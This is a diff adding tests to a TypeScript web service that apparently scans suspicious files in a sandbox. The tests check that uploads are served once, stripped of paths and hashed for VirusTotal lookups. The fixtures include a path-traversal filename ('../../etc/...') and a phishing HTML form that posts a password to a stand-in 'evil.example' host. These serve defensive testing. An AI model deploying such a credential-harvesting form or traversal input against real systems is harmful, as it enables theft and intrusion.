@@ -1,4 +1,5 @@
 import assert from 'node:assert/strict';
+import { createHash } from 'node:crypto';
 import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
@@ -60,7 +61,7 @@ after(() => rmSync(CLIENT, { recursive: true, force: true }));
 
 interface Rig { app: ReturnType<typeof createApp>; calls: { approve: unknown[][]; reject: unknown[][]; inputs: TaskInput[]; shots: string[] }; finish(r?: TaskResult): void; fail(): void; progress(p: Progress): void }
 
-function rig(opts: { sender?: AppDeps['sender']; urlscan?: AppDeps['urlscan']; chat?: AppDeps['chat']; limits?: Partial<LimitConfig>; submitError?: Error | (() => Error | null); shot?: Buffer; result?: TaskResult; now?: () => number } = {}): Rig {
+function rig(opts: { fileReputation?: AppDeps['fileReputation']; sender?: AppDeps['sender']; urlscan?: AppDeps['urlscan']; chat?: AppDeps['chat']; limits?: Partial<LimitConfig>; submitError?: Error | (() => Error | null); shot?: Buffer; result?: TaskResult; now?: () => number } = {}): Rig {
   const calls = { approve: [] as unknown[][], reject: [] as unknown[][], inputs: [] as TaskInput[], shots: [] as string[] };
   const dones: Array<(r: TaskResult) => void> = [];
   const watchers: Array<(p: Progress) => void> = [];
@@ -82,6 +83,7 @@ function rig(opts: { sender?: AppDeps['sender']; urlscan?: AppDeps['urlscan']; c
     chat: opts.chat,
     ...(opts.urlscan ? { urlscan: opts.urlscan } : {}),
     ...(opts.sender ? { sender: opts.sender } : {}),
+    ...(opts.fileReputation ? { fileReputation: opts.fileReputation } : {}),
     store: createStore(null, undefined, opts.now),
     limiter: createLimiter({ ...DEFAULT_LIMITS, ...opts.limits }, opts.now),
     demos: [{ label: 'Demo', url: 'https://example.com/' }],
@@ -990,4 +992,92 @@ test('the sender of an email: only a domain is taken, cleaned; a few asks a minu
   assert.equal((await ask({ domain: 'x.example' }, '2.2.2.2')).status, 429);
   assert.equal((await ask({ domain: 'x.example' }, '3.3.3.3')).status, 200, 'another address is not held back');
   assert.equal((await rig().app.request('/api/sender', { method: 'POST', headers: JSONH, body: '{"domain":"x.example"}' })).status, 404);
+});
+
+// ---- a file: in memory until the sandbox fetches it once ----------------------------------------------------------
+
+const postFile = (app: Rig['app'], data: Buffer | string, name = 'invoice.pdf', headers: Record<string, string> = {}) =>
+  app.request('/api/files', { method: 'POST', headers: { host: HOST, 'content-type': 'application/pdf', 'x-file-name': encodeURIComponent(name), ...headers }, body: typeof data === 'string' ? Buffer.from(data) : data });
+
+test('a file check: one run in one session from our page; the sandbox fetches the file once, as a download nothing renders', async () => {
+  const r = rig();
+  const res = await postFile(r.app, '%PDF-1.7 hello', '../../etc/Invoice 2026.pdf');
+  assert.equal(res.status, 202);
+  const j = (await res.json()) as { id: string; key: string; name: string; bytes: number; sha256: string };
+  assert.equal(j.name, 'Invoice 2026.pdf', 'no path from the sender\'s machine');
+  assert.equal(j.bytes, 14);
+  assert.equal(j.sha256, createHash('sha256').update('%PDF-1.7 hello').digest('hex'));
+  const input = r.calls.inputs[0]!;
+  assert.equal(input.url, `https://zerostress.space/fx/${j.id}`);
+  assert.ok(input.session, 'a session: the agent fetches the file in it');
+  assert.equal(input.file!.sha256, j.sha256);
+  assert.equal(input.file!.view, undefined, 'a PDF is not a page to look at');
+  const token = /\/f\/([A-Za-z0-9_-]{20,})$/.exec(input.file!.url)![1]!;
+  const page = await (await r.app.request(`/fx/${j.id}`)).text();
+  assert.ok(page.includes(`href="/f/${token}"`));
+  assert.doesNotMatch(page, /<script/i);
+  const got = await r.app.request(`/f/${token}`);
+  assert.equal(got.status, 200);
+  assert.equal(got.headers.get('content-type'), 'application/octet-stream');
+  assert.match(got.headers.get('content-disposition') ?? '', /^attachment;/);
+  assert.match(got.headers.get('content-security-policy') ?? '', /sandbox/);
+  assert.equal(got.headers.get('cache-control'), 'no-store');
+  assert.equal(Buffer.from(await got.arrayBuffer()).toString(), '%PDF-1.7 hello');
+  assert.equal((await r.app.request(`/f/${token}`)).status, 404, 'once, and then it is gone');
+  r.finish();
+  await tick();
+  assert.equal((await r.app.request(`/fx/${j.id}`)).status, 404, 'the page is gone with the run');
+});
+
+test('a file check: an attached page is also served once to look at, in a sandbox of its own; nothing is left after the run', async () => {
+  const r = rig();
+  const j = (await (await postFile(r.app, '<form action="https://evil.example/p"><input type=password></form>', 'statement.html', { 'content-type': 'text/html' })).json()) as { id: string };
+  const input = r.calls.inputs[0]!;
+  const token = /\/f\/([A-Za-z0-9_-]{20,})$/.exec(input.file!.url)![1]!;
+  assert.equal(input.file!.view, `https://zerostress.space/f/${token}/view`);
+  assert.ok((await (await r.app.request(`/fx/${j.id}`)).text()).includes(`/f/${token}/view`));
+  assert.equal((await r.app.request(`/f/${token}`)).status, 200);
+  assert.equal((await r.app.request(`/f/${token}`)).status, 404, 'the file of a page is fetched once too, while its view still waits');
+  const v = await r.app.request(`/f/${token}/view`);
+  assert.equal(v.status, 200);
+  const csp = v.headers.get('content-security-policy') ?? '';
+  assert.match(csp, /^sandbox /);
+  assert.doesNotMatch(csp, /allow-same-origin/, 'never this site\'s origin');
+  assert.equal((await r.app.request(`/f/${token}/view`)).status, 404, 'once');
+  r.finish();
+  await tick();
+  assert.equal((await r.app.request(`/f/${token}/view`)).status, 404, 'nothing is left after the run');
+});
+
+test('a file check: too large, empty, or from another site starts nothing; it counts as a check', async () => {
+  const r = rig({ limits: { perHour: 1 } });
+  assert.equal((await postFile(r.app, Buffer.alloc(10 * 1024 * 1024 + 1))).status, 413);
+  assert.equal((await postFile(r.app, '')).status, 400);
+  assert.equal((await postFile(r.app, 'x', 'a.txt', { origin: 'https://evil.example' })).status, 403);
+  assert.equal(r.calls.inputs.length, 0);
+  assert.equal((await postFile(r.app, 'x')).status, 202);
+  assert.equal((await postFile(r.app, 'y')).status, 429);
+});
+
+test('a file check: a run that fails drops the file too', async () => {
+  const r = rig();
+  await postFile(r.app, 'x');
+  const token = /\/f\/([A-Za-z0-9_-]{20,})$/.exec(r.calls.inputs[0]!.file!.url)![1]!;
+  r.fail();
+  await tick();
+  assert.equal((await r.app.request(`/f/${token}`)).status, 404);
+});
+
+test('a file\'s hash: only a SHA-256 goes to VirusTotal, never anything else', async () => {
+  const asked: string[] = [];
+  const r = rig({ fileReputation: async (h) => { asked.push(h); return { known: true, malicious: 30, suspicious: 0, total: 70, label: 'trojan.x', first_seen: null }; } });
+  const ask = (body: unknown) => r.app.request('/api/file-hash', { method: 'POST', headers: JSONH, body: JSON.stringify(body) });
+  const ok = await ask({ sha256: 'A'.repeat(64) });
+  assert.equal(ok.status, 200);
+  assert.equal(((await ok.json()) as { virustotal: { malicious: number } }).virustotal.malicious, 30);
+  assert.deepEqual(asked, ['a'.repeat(64)]);
+  assert.equal((await ask({ sha256: 'x' })).status, 400);
+  assert.equal((await ask({ sha256: 'a'.repeat(64), name: 'invoice.pdf' })).status, 400, 'nothing but the hash');
+  assert.equal(asked.length, 1);
+  assert.equal((await rig().app.request('/api/file-hash', { method: 'POST', headers: JSONH, body: JSON.stringify({ sha256: 'a'.repeat(64) }) })).status, 404, 'absent without a key');
 });
